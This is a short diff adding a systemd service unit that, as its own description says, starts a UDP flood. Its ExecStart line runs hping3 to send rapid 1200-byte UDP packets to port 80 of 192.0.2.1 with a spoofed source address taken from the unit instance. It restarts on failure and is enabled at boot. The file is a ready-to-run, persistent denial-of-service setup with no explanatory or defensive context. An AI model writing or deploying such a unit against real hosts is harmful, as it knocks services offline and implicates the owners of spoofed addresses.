@@ -1,0 +1,10 @@
+[Unit]
+Description=Start a UDP flood to 192.0.2.1:80 
+
+[Service]
+Type=simple
+ExecStart=hping3 -i u300 --keep --udp -p 80 -d 1200 192.0.2.1 -a %i
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
